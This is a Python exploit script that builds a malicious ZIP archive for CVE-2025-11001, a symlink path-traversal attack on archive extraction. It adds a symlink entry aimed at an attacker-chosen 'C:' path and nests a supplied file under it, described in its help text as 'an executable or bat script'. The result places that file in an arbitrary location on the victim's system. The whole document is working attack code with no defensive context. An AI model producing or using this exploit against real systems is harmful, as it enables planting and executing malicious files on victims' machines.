import argparse
import os
import time
import zipfile

def add_dir(z, arcname):
    if not arcname.endswith('/'):
        arcname += '/'
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o040755 << 16) | 0x10
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, b'')

def add_symlink(z, arcname, target):
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o120777 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, target.encode('utf-8'))

def add_file_from_disk(z, arcname, src_path):
    with open(src_path, 'rb') as f:
        payload = f.read()
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o100644 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, payload)

def main():
    parser = argparse.ArgumentParser(
        description="Crafts a zip that exploits CVE-2025-11001."
    )
    parser.add_argument(
        "--zip-out", "-o",
        required=True,
        help="Path to the output ZIP file."
    )
    parser.add_argument(
        "--symlink-target", "-t",
        required=True,
        help="Destination path the symlink points to - specify a \"C:\" path"
    )
    parser.add_argument(
        "--data-file", "-f",
        required=True,
        help="Path to the local file to embed e.g an executable or bat script."
    )
    parser.add_argument(
        "--dir-name",
        default="data",
        help="Top-level directory name inside the ZIP (default: data)."
    )
    parser.add_argument(
        "--link-name",
        default="link_in",
        help="Symlink entry name under the top directory (default: link_in)."
    )
    args = parser.parse_args()

    top_dir = args.dir_name.rstrip("/")
    link_entry = f"{top_dir}/{args.link_name}"
    embedded_name = os.path.basename(args.data_file)
    file_entry = f"{link_entry}/{embedded_name}"

    with zipfile.ZipFile(args.zip_out, "w") as z:
        add_dir(z, top_dir)
        add_symlink(z, link_entry, args.symlink_target)
        add_file_from_disk(z, file_entry, args.data_file)

    print(f"Wrote {args.zip_out}")

if __name__ == "__main__":
    main()
